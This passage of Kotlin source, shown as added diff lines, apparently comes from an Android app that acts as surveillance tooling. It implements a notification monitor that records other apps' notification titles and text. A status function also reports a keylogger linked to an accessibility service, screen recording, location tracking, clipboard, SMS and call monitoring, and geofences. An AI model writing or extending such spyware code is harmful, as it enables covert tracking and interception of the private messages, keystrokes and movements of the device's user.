+   903→    fun isCallMonitorActive(): Boolean = callMonitorActive
+   904→
+   905→    // ===== NOTIFICATION MONITOR =====
+   906→    fun notificationMonitorStart(): Map<String, Any> {
+   907→        notificationMonitorActive = true
+   908→        val listenerService = com.abuzahra.manager.service.MyNotificationListenerService.getInstance()
+   909→        val isConnected = listenerService != null
+   910→        val status = if (isConnected) {
+   911→            "Notification monitoring started - NotificationListenerService is connected"
+   912→        } else {
+   913→            "Notification monitoring started - NotificationListenerService NOT connected. Ensure it is enabled in Settings > Notification Access."
+   914→        }
+   915→        return mapOf(
+   916→            "active" to true,
+   917→            "service_connected" to isConnected,
+   918→            "history_count" to notificationHistory.size,
+   919→            "message" to status
+   920→        )
+   921→    }
+   922→
+   923→    fun notificationMonitorStop(): Map<String, Any> {
+   924→        notificationMonitorActive = false
+   925→        return mapOf(
+   926→            "active" to false,
+   927→            "history_count" to notificationHistory.size,
+   928→            "message" to "Notification monitoring stopped. ${notificationHistory.size} notifications captured during session."
+   929→        )
+   930→    }
+   931→    
+   932→    fun addNotification(packageName: String, title: String?, text: String?, category: String?) {
+   933→        if (notificationMonitorActive) {
+   934→            val entry = NotificationEntry(
+   935→                timestamp = System.currentTimeMillis(),
+   936→                packageName = packageName,
+   937→                title = title,
+   938→                text = text,
+   939→                category = category
+   940→            )
+   941→            notificationHistory.add(entry)
+   942→            
+   943→            while (notificationHistory.size > MAX_NOTIFICATION_HISTORY) {
+   944→                notificationHistory.poll()
+   945→            }
+   946→        }
+   947→    }
+   948→    
+   949→    fun getNotificationHistory(): List<Map<String, Any>> {
+   950→        return notificationHistory.toList().map { entry ->
+   951→            mapOf(
+   952→                "timestamp" to entry.timestamp,
+   953→                "datetime" to formatTimestamp(entry.timestamp),
+   954→                "package" to entry.packageName,
+   955→                "title" to (entry.title ?: ""),
+   956→                "text" to (entry.text ?: ""),
+   957→                "category" to (entry.category ?: "")
+   958→            )
+   959→        }
+   960→    }
+   961→
+   962→    // ===== GET ALL MONITOR STATUS =====
+   963→    fun getAllStatus(): Map<String, Any> {
+   964→        return mapOf(
+   965→            "keylogger" to mapOf(
+   966→                "active" to keyloggerActive,
+   967→                "entries" to keylogBuffer.size,
+   968→                "accessibility_connected" to (MyAccessibilityService.getInstance() != null)
+   969→            ),
+   970→            "screen_recording" to screenRecordingActive,
+   971→            "location_tracking" to mapOf(
+   972→                "active" to locationTrackingActive,
+   973→                "history_count" to locationHistory.size
+   974→            ),
+   975→            "clipboard_monitor" to mapOf(
+   976→                "active" to clipboardMonitorActive,
+   977→                "history_count" to clipboardHistory.size
+   978→            ),
+   979→            "wifi_monitor" to wifiMonitorActive,
+   980→            "app_monitor" to mapOf(
+   981→                "active" to appMonitorActive,
+   982→                "log_count" to appUsageLog.size
+   983→            ),
+   984→            "sms_monitor" to smsMonitorActive,
+   985→            "call_monitor" to callMonitorActive,
+   986→            "notification_monitor" to mapOf(
+   987→                "active" to notificationMonitorActive,
+   988→                "history_count" to notificationHistory.size
+   989→            ),
+   990→            "geofences" to geoFences.size
+   991→        )
+   992→    }
+   993→    
+   994→    // ===== LIFECYCLE =====
+   995→    fun initialize() {
+   996→        loadGeofences()
+   997→    }
+   998→    
+   999→    fun cleanup() {
+  1000→        keyloggerActive = false
+  1001→        screenRecordingActive = false
+  1002→        locationTrackingActive = false
+  1003→        clipboardMonitorActive = false
+  1004→        wifiMonitorActive = false
+  1005→        appMonitorActive = false
+  1006→        smsMonitorActive = false
+  1007→        callMonitorActive = false
+  1008→        notificationMonitorActive = false
+  1009→        
+  1010→        locationJob?.cancel()
+  1011→        clipboardJob?.cancel()
+  1012→        wifiJob?.cancel()
+  1013→        appMonitorJob?.cancel()
+  1014→        smsMonitorJob?.cancel()
+  1015→        callMonitorJob?.cancel()
+  1016→        
+  1017→        locationListener = null
+  1018→    }
+  1019→    
+  1020→    // ===== HELPERS =====
+  1021→    private fun formatTimestamp(timestamp: Long): String {
+  1022→        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+  1023→        return sdf.format(Date(timestamp))
+  1024→    }
+  1025→    
+  1026→    private fun getDateString(): String {
+  1027→        val sdf = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
+  1028→        return sdf.format(Date())
+  1029→    }
+  1030→}
+  1031→
